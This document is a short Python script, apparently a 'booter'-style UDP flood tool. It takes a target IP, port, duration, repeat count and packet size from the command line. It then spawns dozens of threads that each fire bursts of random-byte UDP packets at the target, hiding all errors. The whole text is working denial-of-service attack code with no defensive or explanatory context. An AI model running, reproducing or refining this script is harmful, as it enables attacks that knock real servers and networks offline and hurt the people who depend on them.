import socket,sys,threading,os

def UDP_ATTACK(ip,port,booter,size):
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        bytes_loader = os.urandom(size)
        bytes_loader2 = bytearray(os.urandom(size))
        for _ in range(booter):
         s.sendto(bytes_loader,(ip,port))
         s.sendto(bytes_loader,(ip,port))
         s.sendto(bytes_loader,(ip,port))
         s.sendto(bytes_loader,(ip,port))
         s.sendto(bytes_loader,(ip,port))
         s.sendto(bytes_loader2,(ip,port))
         s.sendto(bytes_loader2,(ip,port))
         s.sendto(bytes_loader2,(ip,port))
         s.sendto(bytes_loader2,(ip,port))
         s.sendto(bytes_loader2,(ip,port))
    except:
       pass

def RUNNING_UDP_ATTACK(ip,port,time,booter,size):
   for _ in range(time):
    threading.Thread(target=UDP_ATTACK,args=(ip,port,booter,size)).start()
    threading.Thread(target=UDP_ATTACK,args=(ip,port,booter,size)).start()
    threading.Thread(target=UDP_ATTACK,args=(ip,port,booter,size)).start()
    threading.Thread(target=UDP_ATTACK,args=(ip,port,booter,size)).start()
    threading.Thread(target=UDP_ATTACK,args=(ip,port,booter,size)).start()

IP = ''
PORT =0
TIME = 0
BOOTER = 0
SIZE = 0

if len(sys.argv) == 6:
    IP = str(sys.argv[1])
    PORT = int(sys.argv[2])
    TIME = int(sys.argv[3])
    BOOTER = int(sys.argv[4])
    SIZE = int(sys.argv[5])
else:
    exit()

for _ in range(50):
 threading.Thread(target=RUNNING_UDP_ATTACK,args=(IP,PORT,TIME,BOOTER,SIZE)).start()